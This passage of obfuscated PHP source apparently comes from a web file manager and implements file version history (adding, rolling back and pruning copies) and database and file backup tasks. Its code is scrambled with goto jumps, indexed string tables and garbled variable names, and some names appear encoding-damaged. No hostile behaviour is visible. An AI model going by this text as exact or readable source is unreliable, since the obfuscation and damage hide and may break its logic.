$fÁè‰Í‹Ÿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bÀî¶Î¼æÈ = self::$_historyBase . ltrim(KodIO::clear($bÛÅ‹ùçä‹), $fÁè‰Í‹Ÿ[8]); $bÀî¶Î¼æÈ = str_replace(array($fÁè‰Í‹Ÿ[1073]), array($fÁè‰Í‹Ÿ[1074]), $bÀî¶Î¼æÈ); return $bÀî¶Î¼æÈ; } public static function log($dÎ·´ÓÀ¸±) { } public static function historyCount($aå¥¯³ÂÈ) { $EÑ®ù†ê¦ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C·æà½öÑŞ = array(); $aø­äÆñÜ¼ = array(); foreach ($aå¥¯³ÂÈ as $Dá‡Ø’Û˜ ) { $FæùªĞˆ†± = get_path_father($Dá‡Ø’Û˜ ); if (!$aø­äÆñÜ¼[$FæùªĞˆ†±]) { $aø­äÆñÜ¼[$FæùªĞˆ†±] = array(); } $aø­äÆñÜ¼[$FæùªĞˆ†±][] = get_path_this($Dá‡Ø’Û˜ ); } foreach ($aø­äÆñÜ¼ as $FæùªĞˆ†± => $eºåµß¢½) { $aĞ·‘Àô† = self::parsePath($FæùªĞˆ†±); if (!$aĞ·‘Àô†) { continue; } foreach ($eºåµß¢½ as $D½ ®©ª¬) { $D¿Ù·ÓƒÎ‹ = self::listData(rtrim($aĞ·‘Àô†, $EÑ®ù†ê¦[8]) . $EÑ®ù†ê¦[8] . $D½ ®©ª¬, !1); if ($D¿Ù·ÓƒÎ‹ && $D¿Ù·ÓƒÎ‹[$EÑ®ù†ê¦[363]]) { $C·æà½öÑŞ[rtrim($FæùªĞˆ†±, $EÑ®ù†ê¦[8]) . $EÑ®ù†ê¦[8] . $D½ ®©ª¬] = count($D¿Ù·ÓƒÎ‹[$EÑ®ù†ê¦[363]]); } } } return $C·æà½öÑŞ; } public static function add($aÀ–˜Û˜) { goto b¹ßØ¢•‚¢; côğ¼ •: if ($aš³É©ÕÓ¡ && $aš³É©ÕÓ¡[0][$C§Ç÷õÁ[170]] == $EëÃø»ãë¦) { return !0; } if (array_key_exists($C§Ç÷õÁ[194], $BÑˆÖÈ·÷Æ) && !$BÑˆÖÈ·÷Æ[$C§Ç÷õÁ[194]]) { return !1; } $c¨§øàµ½ = short_id(time()); goto DôÄêÆš¬; DôÄêÆš¬: $då°¼ŸÒªà = array($C§Ç÷õÁ[385] => $c¨§øàµ½, $C§Ç÷õÁ[170] => $EëÃø»ãë¦, $C§Ç÷õÁ[28] => $BÑˆÖÈ·÷Æ[$C§Ç÷õÁ[28]] . $C§Ç÷õÁ[94] . date($C§Ç÷õÁ[1078]) . rand_string(1), $C§Ç÷õÁ[77] => $BÑˆÖÈ·÷Æ[$C§Ç÷õÁ[77]], $C§Ç÷õÁ[396] => USER_ID, $C§Ç÷õÁ[192] => time(), $C§Ç÷õÁ[1079] => $C§Ç÷õÁ[33]); IO::mkdir($fæ³¾¥æ¯ò[$C§Ç÷õÁ[1080]]); $aòÀ®‹¿ = IO::copy($aÀ–˜Û˜, $fæ³¾¥æ¯ò[$C§Ç÷õÁ[1080]], !1, $då°¼ŸÒªà[$C§Ç÷õÁ[28]]); goto BÂí‹³ëŞ; EïêŒËïîĞ: if ($A›Ú¡ÁÏÂ’ <= 0) { return; } $EëÃø»ãë¦ = IO::hashSimple($aÀ–˜Û˜); $BÑˆÖÈ·÷Æ = IO::info($aÀ–˜Û˜); goto C¦áöò¦ÜÔ; d¾Ô“œ®Ô: return self::saveData($fæ³¾¥æ¯ò[$C§Ç÷õÁ[1081]], $aš³É©ÕÓ¡); goto eÜÑŠª‹Œ; Câ¬™ºÄª: $Eö†‘ˆ¾‘« = Model($C§Ç÷õÁ[1075])->get($C§Ç÷õÁ[1076]); $A›Ú¡ÁÏÂ’ = $GLOBALS[$C§Ç÷õÁ[6]][$C§Ç÷õÁ[87]][$C§Ç÷õÁ[1054]]; $cØ•ï„‡÷ = $Eö†‘ˆ¾‘« == $C§Ç÷õÁ[1077] ? 5 : $A›Ú¡ÁÏÂ’; goto EïêŒËïîĞ; b¹ßØ¢•‚¢: $C§Ç÷õÁ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fæ³¾¥æ¯ò = self::listData($aÀ–˜Û˜); if (!$fæ³¾¥æ¯ò) { return; } goto Câ¬™ºÄª; C¦áöò¦ÜÔ: $aš³É©ÕÓ¡ = $fæ³¾¥æ¯ò[$C§Ç÷õÁ[363]]; if ($BÑˆÖÈ·÷Æ[$C§Ç÷õÁ[77]] == 0) { return; } if ($BÑˆÖÈ·÷Æ[$C§Ç÷õÁ[77]] >= 1024 * 1024 * 500) { return !1; } goto côğ¼ •; BÂí‹³ëŞ: if (!$aòÀ®‹¿) { self::clearEmptyFolder($fæ³¾¥æ¯ò[$C§Ç÷õÁ[1080]]); return !1; } array_unshift($aš³É©ÕÓ¡, $då°¼ŸÒªà); if (count($aš³É©ÕÓ¡) > $cØ•ï„‡÷) { $AÄ½·…›ŞÁ = array_slice($aš³É©ÕÓ¡, $cØ•ï„‡÷); foreach ($AÄ½·…›ŞÁ as $c…ÅÅŠ¸ë) { IO::remove($fæ³¾¥æ¯ò[$C§Ç÷õÁ[1080]] . $c…ÅÅŠ¸ë[$C§Ç÷õÁ[28]]); } $aš³É©ÕÓ¡ = array_slice($aš³É©ÕÓ¡, 0, $cØ•ï„‡÷); } goto d¾Ô“œ®Ô; eÜÑŠª‹Œ: } public static function remove($dùÎö‡ÊÒÑ, $CİÂø¬ÑÜƒ) { $F§™ÕË£· =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÊ¼æã’¸ = self::listData($dùÎö‡ÊÒÑ); $C•…µ…ã› = array(); if (!$eÊ¼æã’¸) { return !1; } foreach ($eÊ¼æã’¸[$F§™ÕË£·[363]] as $eÁÂ§šªÍš) { if ($eÁÂ§šªÍš[$F§™ÕË£·[385]] == $CİÂø¬ÑÜƒ) { IO::remove($eÊ¼æã’¸[$F§™ÕË£·[1080]] . $eÁÂ§šªÍš[$F§™ÕË£·[28]]); continue; } $C•…µ…ã›[] = $eÁÂ§šªÍš; } return self::saveData($eÊ¼æã’¸[$F§™ÕË£·[1081]], $C•…µ…ã›); } public static function clear($EÑËßÊùøÜ, $cà²ğ“‘ = true) { $CÅ¶õˆ­æĞ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eº÷ì“³Ùß = self::listData($EÑËßÊùøÜ, $cà²ğ“‘); if (!$eº÷ì“³Ùß) { return !1; } foreach ($eº÷ì“³Ùß[$CÅ¶õˆ­æĞ[363]] as $EÖ¨·¹Ô‘¸) { IO::remove($eº÷ì“³Ùß[$CÅ¶õˆ­æĞ[1080]] . $EÖ¨·¹Ô‘¸[$CÅ¶õˆ­æĞ[28]]); } return self::saveData($eº÷ì“³Ùß[$CÅ¶õˆ­æĞ[1081]], array()); } public static function moveHistory($A’ÏË÷§ŒÊ, $C’ïƒòÃœù = '', $CÂ”Ãé„Æ = '') { goto Cñª†¨åƒ÷; eÎ‰ïÚ½åŸ: $DŒËºïíŠĞ = substr(get_path_this($cÜçö´‹«[$DÜçÂŒ“äÜ[1081]]), 0, -strlen($d²ç¤„ßø)); foreach ($cÜçö´‹«[$DÜçÂŒ“äÜ[363]] as $E·¢íïšÀĞ => $aÄ°™™ª÷Š) { $dÑ®¯«ª—Â = $C’ïƒòÃœù . substr($aÄ°™™ª÷Š[$DÜçÂŒ“äÜ[28]], strlen($DŒËºïíŠĞ)); $b–Ú™ß…Ê = IO::move($cÜçö´‹«[$DÜçÂŒ“äÜ[1080]] . $aÄ°™™ª÷Š[$DÜçÂŒ“äÜ[28]], $CÂ”Ãé„Æ, !1, $dÑ®¯«ª—Â); if ($b–Ú™ß…Ê) { $cÜçö´‹«[$DÜçÂŒ“äÜ[363]][$E·¢íïšÀĞ][$DÜçÂŒ“äÜ[28]] = $dÑ®¯«ª—Â; } } $cÜçö´‹«[$DÜçÂŒ“äÜ[1081]] = IO::move($cÜçö´‹«[$DÜçÂŒ“äÜ[1081]], $CÂ”Ãé„Æ, !1, $C’ïƒòÃœù . $d²ç¤„ßø); goto e°ÛÚµŸÈè; Cñª†¨åƒ÷: $DÜçÂŒ“äÜ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÜçö´‹« = self::listData($A’ÏË÷§ŒÊ, !1); if (!$cÜçö´‹« || !$cÜçö´‹«[$DÜçÂŒ“äÜ[363]]) { return !1; } goto FÉ†›‰âĞ; e°ÛÚµŸÈè: self::saveData($cÜçö´‹«[$DÜçÂŒ“äÜ[1081]], $cÜçö´‹«[$DÜçÂŒ“äÜ[363]]); self::clearEmptyFolder($cÜçö´‹«[$DÜçÂŒ“äÜ[1080]]); goto fœ÷…Ç¡ô; FÉ†›‰âĞ: $d²ç¤„ßø = $DÜçÂŒ“äÜ[1068]; $C’ïƒòÃœù = $C’ïƒòÃœù ? $C’ïƒòÃœù : get_path_this($A’ÏË÷§ŒÊ); $CÂ”Ãé„Æ = $CÂ”Ãé„Æ ? $CÂ”Ãé„Æ : $cÜçö´‹«[$DÜçÂŒ“äÜ[1080]]; goto eÎ‰ïÚ½åŸ; fœ÷…Ç¡ô: } public static function rollback($f¿Œò‰¢…ğ, $Aƒ‰›İß¥µ) { $aÖ‰Ô¥›ç² =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Fæ˜“ïé× = self::listData($f¿Œò‰¢…ğ); if (!$Fæ˜“ïé×) { return; } $D¶Øæ¯©ƒé = IO::info($f¿Œò‰¢…ğ); foreach ($Fæ˜“ïé×[$aÖ‰Ô¥›ç²[363]] as $A’®î§Ü‚š => $FÖŒÆäÈ³) { if ($FÖŒÆäÈ³[$aÖ‰Ô¥›ç²[385]] == $Aƒ‰›İß¥µ) { self::add($f¿Œò‰¢…ğ); $döˆªÍ¤£ = $Fæ˜“ïé×[$aÖ‰Ô¥›ç²[1080]] . $FÖŒÆäÈ³[$aÖ‰Ô¥›ç²[28]]; $aœØ´ÛÄã = IO::copy($döˆªÍ¤£, IO::pathFather($f¿Œò‰¢…ğ), REPEAT_REPLACE, $D¶Øæ¯©ƒé[$aÖ‰Ô¥›ç²[28]]); if ($aœØ´ÛÄã) { self::remove($f¿Œò‰¢…ğ, $Aƒ‰›İß¥µ); } return $aœØ´ÛÄã; } } return !1; } public static function setDetail($CÆ‘…ë²—Í, $AéñõìÄ³¥, $Có‰¡«¢) { $AŠ´Á†‚ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B´ìå©¡ = self::listData($CÆ‘…ë²—Í); if (!$B´ìå©¡) { return; } foreach ($B´ìå©¡[$AŠ´Á†‚[363]] as $bí÷ôÀ„ŒÕ => $A£ã‰À¤‡‹) { if ($A£ã‰À¤‡‹[$AŠ´Á†‚[385]] == $AéñõìÄ³¥) { $B´ìå©¡[$AŠ´Á†‚[363]][$bí÷ôÀ„ŒÕ][$AŠ´Á†‚[1079]] = $Có‰¡«¢; self::saveData($B´ìå©¡[$AŠ´Á†‚[1081]], $B´ìå©¡[$AŠ´Á†‚[363]]); return !0; } } return !1; } public static function fileInfo($bøáîçÌĞ, $Fõ¦‡° ³æ) { goto cˆºí›”–; a‰î×›Çš¨: $C·èŞÏè‰Å = $eìøóÁ¢Ê§[33]; foreach ($dÉ˜¢Åïö[$eìøóÁ¢Ê§[363]] as $cÃ‚…ï¤Üç => $f¬É™Âñ˜º) { if ($f¬É™Âñ˜º[$eìøóÁ¢Ê§[385]] != $Fõ¦‡° ³æ) { continue; } $C·èŞÏè‰Å = $dÉ˜¢Åïö[$eìøóÁ¢Ê§[1080]] . $f¬É™Âñ˜º[$eìøóÁ¢Ê§[28]]; break; } if (!$C·èŞÏè‰Å) { show_json(LNG($eìøóÁ¢Ê§[104]), !1); } goto A´¤³Ø“¨Ş; cˆºí›”–: $eìøóÁ¢Ê§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dÉ˜¢Åïö = self::listData($bøáîçÌĞ); if (!$dÉ˜¢Åïö) { show_json(LNG($eìøóÁ¢Ê§[104]), !1); } goto a‰î×›Çš¨; A´¤³Ø“¨Ş: return IO::info($C·èŞÏè‰Å); goto e˜ˆö†¿í‚; e˜ˆö†¿í‚: } public static function fileOut($cÎøÏåÚõ, $Aİ¥¬˜éš, $d‡âèŒÀ¢‡ = false) { $CùŠ÷« =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b„‚®…²Ü = self::fileInfo($cÎøÏåÚõ, $Aİ¥¬˜éš); $aÚè¤­ˆŒ… =& $GLOBALS[$CùŠ÷«[7]]; $d‡âèŒÀ¢‡ = isset($aÚè¤­ˆŒ…[$CùŠ÷«[1045]]) && $aÚè¤­ˆŒ…[$CùŠ÷«[1045]] == 1; if (isset($aÚè¤­ˆŒ…[$CùŠ÷«[29]]) && $aÚè¤­ˆŒ…[$CùŠ÷«[29]] == $CùŠ÷«[1082]) { return IO::fileOutImage($b„‚®…²Ü[$CùŠ÷«[75]], $aÚè¤­ˆŒ…[$CùŠ÷«[1083]]); } IO::fileOut($b„‚®…²Ü[$CùŠ÷«[75]], $d‡âèŒÀ¢‡, get_path_this($cÎøÏåÚõ)); } public static function listData($E†Ÿ¡œ¼ô, $eìØƒôÂ¥› = true) { goto cÃï’£¥Û‘; cÃï’£¥Û‘: $c„ã¬¶í ¤ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($eìØƒôÂ¥› && !IO::exist($E†Ÿ¡œ¼ô)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto e¦–åÙ¨Ç°; fÓØÆãœ—: $Céø°ÙÖ¬ = IO::getContent($FŒ‚ƒ¨¢Ã½[$c„ã¬¶í ¤[1081]]); if ($Céø°ÙÖ¬) { $B‰Öç´¼ôÚ = json_decode($Céø°ÙÖ¬, !0); if (is_array($B‰Öç´¼ôÚ)) { $FŒ‚ƒ¨¢Ã½[$c„ã¬¶í ¤[363]] = $B‰Öç´¼ôÚ; } } return $FŒ‚ƒ¨¢Ã½; goto aÔ®ÛÂöÆ¶; e¦–åÙ¨Ç°: if (substr($E†Ÿ¡œ¼ô, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $AÃƒ—Ì§¤ğ = self::pathHistory($E†Ÿ¡œ¼ô); $FŒ‚ƒ¨¢Ã½ = array($c„ã¬¶í ¤[1081] => $AÃƒ—Ì§¤ğ . $c„ã¬¶í ¤[1068], $c„ã¬¶í ¤[1080] => rtrim(get_path_father($AÃƒ—Ì§¤ğ), $c„ã¬¶í ¤[8]) . $c„ã¬¶í ¤[8], $c„ã¬¶í ¤[363] => array()); goto fÓØÆãœ—; aÔ®ÛÂöÆ¶: } private static function saveData($cŒÒ«°åø, $fÄŠ®‚©¼÷) { goto FÇ†ŒñËº; F—Íä¬š‚Û: return !0; goto B¡Á¢œ¸­‹; FÇ†ŒñËº: $f‘ØÅİŠ©Æ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; self::log($f‘ØÅİŠ©Æ[1084] . $cŒÒ«°åø . $f‘ØÅİŠ©Æ[67] . count($fÄŠ®‚©¼÷), $f‘ØÅİŠ©Æ[685]); if ($fÄŠ®‚©¼÷) { return IO::setContent($cŒÒ«°åø, json_encode($fÄŠ®‚©¼÷)); } goto bµÑôß—°—; bµÑôß—°—: $e¿«„©öÌğ = IO::pathFather($cŒÒ«°åø); IO::remove($cŒÒ«°åø); self::clearEmptyFolder($e¿«„©öÌğ); goto F—Íä¬š‚Û; B¡Á¢œ¸­‹: } public static function clearEmptyFolder($cï¢šÀåİÓ) { goto CĞ¯ÍÍ©ºõ; dÚÇ‹Ÿõ…: $D˜ùƒŠ§ÆÙ = IO::has($cï¢šÀåİÓ, !0); if ($D˜ùƒŠ§ÆÙ[$c¦ÕÅ”íÏÎ[201]] > 0 || $D˜ùƒŠ§ÆÙ[$c¦ÕÅ”íÏÎ[202]] > 0) { return; } IO::remove($cï¢šÀåİÓ); goto bæ“ö¹ãÌ¡; CĞ¯ÍÍ©ºõ: $c¦ÕÅ”íÏÎ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (trim($cï¢šÀåİÓ, $c¦ÕÅ”íÏÎ[8]) == trim(self::$_historyBase, $c¦ÕÅ”íÏÎ[8])) { return; } $dÍŒ°ÕÇ‚› = IO::pathFather($cï¢šÀåİÓ); goto dÚÇ‹Ÿõ…; bæ“ö¹ãÌ¡: self::clearEmptyFolder($dÍŒ°ÕÇ‚›); goto D˜ºòƒéÄğ; D˜ºòƒéÄğ: } private static function getBasePath() { goto e«º†Íâ® ; A’‹ñº‚ÀÎ: $cŒÜÊ­š Ş = DATA_PATH . $B•æë—ÕÉÏ[1087]; $cŒÜÊ­š Ş = IO::mkdir($cŒÜÊ­š Ş); $cŒÜÊ­š Ş = rtrim($cŒÜÊ­š Ş, $B•æë—ÕÉÏ[8]) . $B•æë—ÕÉÏ[8]; goto aƒÖÔŠ¡»Ú; e«º†Íâ® : $B•æë—ÕÉÏ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cŒÜÊ­š Ş = Model($B•æë—ÕÉÏ[1085])->get($B•æë—ÕÉÏ[1086]); if (IO::exist($cŒÜÊ­š Ş)) { return $cŒÜÊ­š Ş; } goto A’‹ñº‚ÀÎ; aƒÖÔŠ¡»Ú: file_put_contents($cŒÜÊ­š Ş . $B•æë—ÕÉÏ[1088], $B•æë—ÕÉÏ[33]); Model($B•æë—ÕÉÏ[1085])->set($B•æë—ÕÉÏ[1086], $cŒÜÊ­š Ş); return $cŒÜÊ­š Ş; goto A¾ÖªÂƒ±ñ; A¾ÖªÂƒ±ñ: } } goto dºÒ®Šê‹ï; dºùï´†Ü: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto C³ŸÄ„–ùã; EÂš²ã’¿Ö: $F½„‚»Ø±§ = array_diff($F½„‚»Ø±§, array($AªËíîË¯Í[704], $AªËíîË¯Í[705])); foreach ($F½„‚»Ø±§ as $D¤ª¯Œ‡”¦) { $Eğ»œ¹ïÚ += $EÌğò—İ->model($D¤ª¯Œ‡”¦)->count(); } $d¸ë¨’È‹ù = new Task($AªËíîË¯Í[706], $AªËíîË¯Í[707], $Eğ»œ¹ïÚ, LNG($AªËíîË¯Í[708]) . $AªËíîË¯Í[709] . LNG($AªËíîË¯Í[710])); goto f‰ˆ¬Ñ¶; C³ŸÄ„–ùã: $AªËíîË¯Í =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $CÊÌÄ¿ñ–½ = Backup::get(); self::$io = $CÊÌÄ¿ñ–½[$AªËíîË¯Í[685]]; goto AÏĞø¼°ãğ; b‚­ãÊøÄù: mk_dir($aİ´–çªõÄ); $Eğ»œ¹ïÚ = $E¿ÖøŞõ‰ƒ = 0; try { $F½„‚»Ø±§ = $EÌğò—İ->db()->getTables(); } catch (Exception $BÄªµ•ôª) { return !1; } goto EÂš²ã’¿Ö; f‰ˆ¬Ñ¶: foreach ($F½„‚»Ø±§ as $D¤ª¯Œ‡”¦) { $dõÂÑÆ†Ş¯ = $aİ´–çªõÄ . $D¤ª¯Œ‡”¦ . $AªËíîË¯Í[711]; $fØ†‚„Ş¿ = null; if ($D¤ª¯Œ‡”¦ == $AªËíîË¯Í[712] && (!isset($CÊÌÄ¿ñ–½[$AªËíîË¯Í[686]]) || $CÊÌÄ¿ñ–½[$AªËíîË¯Í[686]] == $AªËíîË¯Í[486])) { $fØ†‚„Ş¿ = self::$io; } $E¿ÖøŞõ‰ƒ += $EÌğò—İ->sqlFromDb($D¤ª¯Œ‡”¦, $dõÂÑÆ†Ş¯, $d¸ë¨’È‹ù, $fØ†‚„Ş¿); } $d¸ë¨’È‹ù->end(); $A›³¾ˆ ĞÛ = array($AªËíîË¯Í[713] => $Dƒî§ï±ê³, $AªËíîË¯Í[700] => 1, $AªËíîË¯Í[714] => $Eğ»œ¹ïÚ + 1, $AªËíîË¯Í[715] => $E¿ÖøŞõ‰ƒ); goto b³•Ù¾¦Œ; BºËÊ¼‹­Û: $EÌğò—İ = new DbManage($bßÜ†Á×Î, $Dƒî§ï±ê³); $aİ´–çªõÄ = TEMP_FILES . $AªËíîË¯Í[703] . self::$name . $AªËíîË¯Í[8]; del_dir($aİ´–çªõÄ); goto b‚­ãÊøÄù; b³•Ù¾¦Œ: Backup::set($A›³¾ˆ ĞÛ); if ($Eğ»œ¹ïÚ > $E¿ÖøŞõ‰ƒ) { return !1; } return !0; goto d„±îòÏÖŸ; AÏĞø¼°ãğ: self::$name = $CÊÌÄ¿ñ–½[$AªËíîË¯Í[28]]; $bßÜ†Á×Î = $GLOBALS[$AªËíîË¯Í[6]][$AªËíîË¯Í[17]]; $Dƒî§ï±ê³ = $this->_dbType($bßÜ†Á×Î); goto BºËÊ¼‹­Û; d„±îòÏÖŸ: } private function _dbType($bÑî«Øëğ„) { goto F½İŒå›; D±’«§èá•: return $F¢ÖÄİ»Ø„; goto e˜Éá¹Œ–ƒ; F½İŒå›: $a¶±¬ó”× =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $bÑî«Øëğ„ = array_change_key_case($bÑî«Øëğ„); $F¢ÖÄİ»Ø„ = $bÑî«Øëğ„[$a¶±¬ó”×[716]]; goto aéÖ™‹İœÄ; aéÖ™‹İœÄ: if ($F¢ÖÄİ»Ø„ == $a¶±¬ó”×[717]) { $eË‹›¦ßŸ = explode($a¶±¬ó”×[4], $bÑî«Øëğ„[$a¶±¬ó”×[718]]); $F¢ÖÄİ»Ø„ = $eË‹›¦ßŸ[0]; } $eÃîÎ’Ø‰‚ = array($a¶±¬ó”×[719] => $a¶±¬ó”×[9], $a¶±¬ó”×[720] => $a¶±¬ó”×[721]); if (isset($eÃîÎ’Ø‰‚[$F¢ÖÄİ»Ø„])) { $F¢ÖÄİ»Ø„ = $eÃîÎ’Ø‰‚[$F¢ÖÄİ»Ø„]; } goto D±’«§èá•; e˜Éá¹Œ–ƒ: } } class BackupDbFile { public function __construct() { } public function index() { goto EÈØ»«‚—Ï; dÕ´ø˜¬æÔ: $aÀ¡¿™…‘->end(); Backup::set(array($E­‚–­‹ê¬[727] => $d’£Ï‰†¶‰)); return !0; goto dÌ¦ÜÉ±Îø; a…’åÇÄ‡: if (!$d’£Ï‰†¶‰) { return !1; } Backup::set(array($E­‚–­‹ê¬[722] => $d’£Ï‰†¶‰)); $aÀ¡¿™…‘ = new TaskFileTransfer($E­‚–­‹ê¬[723], $E­‚–­‹ê¬[707], count($eøå¶†ÎàÅ), LNG($E­‚–­‹ê¬[708]) . $E­‚–­‹ê¬[429] . LNG($E­‚–­‹ê¬[710]) . $E­‚–­‹ê¬[724]); goto e“Ò±Ù¬Å±; a•ºÇŞË‹: $c¥ê¹†§£æ = CONTROLLER_DIR . $E­‚–­‹ê¬[726]; IO::copy($D›öİÜ·…ö, $dÅø’œÌƒÆ); IO::copy($c¥ê¹†§£æ, $dÅø’œÌƒÆ); goto dÕ´ø˜¬æÔ; eáŸ®Ÿ”: $c»áŒÏŒˆ = IO::listPath($d—Ùß˜µ´Î); $eøå¶†ÎàÅ = isset($c»áŒÏŒˆ[$E­‚–­‹ê¬[73]]) ? $c»áŒÏŒˆ[$E­‚–­‹ê¬[73]] : array(); $d’£Ï‰†¶‰ = array_sum(array_column($eøå¶†ÎàÅ, $E­‚–­‹ê¬[77])); goto a…’åÇÄ‡; e“Ò±Ù¬Å±: $aÀ¡¿™…‘->task[$E­‚–­‹ê¬[692]] = $d’£Ï‰†¶‰; foreach ($c»áŒÏŒˆ[$E­‚–­‹ê¬[73]] as $EÑ¡ÏŠ±‡) { $BÜä¼‹¢­ = IO::move($EÑ¡ÏŠ±‡[$E­‚–­‹ê¬[75]], $dÅø’œÌƒÆ); if (!$BÜä¼‹¢­) { $aÀ¡¿™…‘->end(); return !1; } } $D›öİÜ·…ö = CONTROLLER_DIR . $E­‚–­‹ê¬[725]; goto a•ºÇŞË‹; FùêÕÙ´: $d—Ùß˜µ´Î = TEMP_FILES . "\x62\141\x63\153\165\160\137{$bîâëŸ³Öğ}\x2f"; $dÅø’œÌƒÆ = "\x7b\x69\x6f\72{$C¨ èÃğâ¸[$E­‚–­‹ê¬[685]]}\175\x2f\144\x61\x74\x61\x62\141\163\x65\57\x62\141\143\153\165\160\137{$bîâëŸ³Öğ}\57"; if (!($dÅø’œÌƒÆ = IO::mkdir($dÅø’œÌƒÆ))) { return !1; } goto eáŸ®Ÿ”; EÈØ»«‚—Ï: $E­‚–­‹ê¬ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C¨ èÃğâ¸ = Backup::get(); $bîâëŸ³Öğ = $C¨ èÃğâ¸[$E­‚–­‹ê¬[28]]; goto FùêÕÙ´; dÌ¦ÜÉ±Îø: } } class BackupFile { public function __construct() { } public function index() { goto aŞÄ‘â¥åÙ; DŞÌÈ¼ÖÉ‡: $FŒÃÍÆÂ = 1000; $d‘Öë…³é = $FÛ·†öÈê = 0; $fµåÔù§‡¡ = array(); goto F†™Œæ¶ñ; cä»Ğ¸¥¥½: $eÖá®” = (int) Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][712])->where($eÜáŒ¶œé)->count($_SERVER[ó¬â¥‰ÊÔ¤Ç£][436]); $bô¸ò•¨ = (int) Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][712])->where($eÜáŒ¶œé)->sum($_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]); $bÉ°ïİµ‚Ü = new TaskFileTransfer($_SERVER[ó¬â¥‰ÊÔ¤Ç£][730], $_SERVER[ó¬â¥‰ÊÔ¤Ç£][707], $eÖá®”, LNG($_SERVER[ó¬â¥‰ÊÔ¤Ç£][708]) . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][709] . LNG($_SERVER[ó¬â¥‰ÊÔ¤Ç£][731])); goto E—£ÚÅª—‡; f÷×ÀÌø³ƒ: $this->_fileFilter($fµåÔù§‡¡); return !0; goto e’¨ó‹”½; aŞÄ‘â¥åÙ: $CÀåÕË©“ = Backup::get(); $Eô¯‚ƒŞÍ¤ = $CÀåÕË©“[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][289]][$_SERVER[ó¬â¥‰ÊÔ¤Ç£][173]][$_SERVER[ó¬â¥‰ÊÔ¤Ç£][436]]; $eÜáŒ¶œé = array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][437] => array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][728], $Eô¯‚ƒŞÍ¤), $_SERVER[ó¬â¥‰ÊÔ¤Ç£][729] => array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][327], $CÀåÕË©“[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][685]])); goto cä»Ğ¸¥¥½; EŠÜÑŸÅ„´: $e†¼”Œ…‘Õ = array($_SERVER[ó¬â¥‰ÊÔ¤Ç£][744] => 1, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][465] => time(), $_SERVER[ó¬â¥‰ÊÔ¤Ç£][702] => 1, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][741] => $Eô¯‚ƒŞÍ¤, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][733] => $bô¸ò•¨, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][732] => $eÖá®”); if ($FÛ·†öÈê) { $e†¼”Œ…‘Õ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][742]] = $dêø›¹£Ç; $e†¼”Œ…‘Õ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][743]] = $a†Í­ˆ‡„„; } Backup::set($e†¼”Œ…‘Õ); goto f÷×ÀÌø³ƒ; Fóå‚Ú›†: $B÷×…øº‹ø = !0; $F“»½Ïš¥Ü = $this->storeIds(); $D›Şƒœâğä = 1; goto DŞÌÈ¼ÖÉ‡; F†™Œæ¶ñ: $a†Í­ˆ‡„„ = $dêø›¹£Ç = 0; do { $Câ©£ÚÙğ = $_SERVER[ó¬â¥‰ÊÔ¤Ç£][734]; $Fé±¶–ë‚Á = Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][712])->where($eÜáŒ¶œé)->field($Câ©£ÚÙğ)->order($_SERVER[ó¬â¥‰ÊÔ¤Ç£][735])->selectPage($FŒÃÍÆÂ, $D›Şƒœâğä); $eÑÆ•Ş‘ = !empty($Fé±¶–ë‚Á[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][363]]) ? $Fé±¶–ë‚Á[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][363]] : array(); foreach ($eÑÆ•Ş‘ as $fˆ…ÛÕ»‹) { goto aóš®ÔÓÓ†; FöÊŒĞ»: $d‘Öë…³é += $fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]]; $dêø›¹£Ç += 1; $a†Í­ˆ‡„„ += $fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]]; goto a™¿‹ÛÁÎ“; aóš®ÔÓÓ†: if (!$this->_fileExist($fˆ…ÛÕ»‹, $fµåÔù§‡¡, $F“»½Ïš¥Ü)) { $eÖá®” -= 1; $bô¸ò•¨ -= (int) $fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]]; write_log("\146\x69\x6c\x65\x20\x6e\157\x74\x20\145\x78\151\163\164\56\146\x69\154\145\111\104\72{$fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][436]]}\x2c\x20\x70\x61\x74\x68\x3a{$fˆ…ÛÕ»‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]]}", $_SERVER[ó¬â¥‰ÊÔ¤Ç£][736]); continue; } 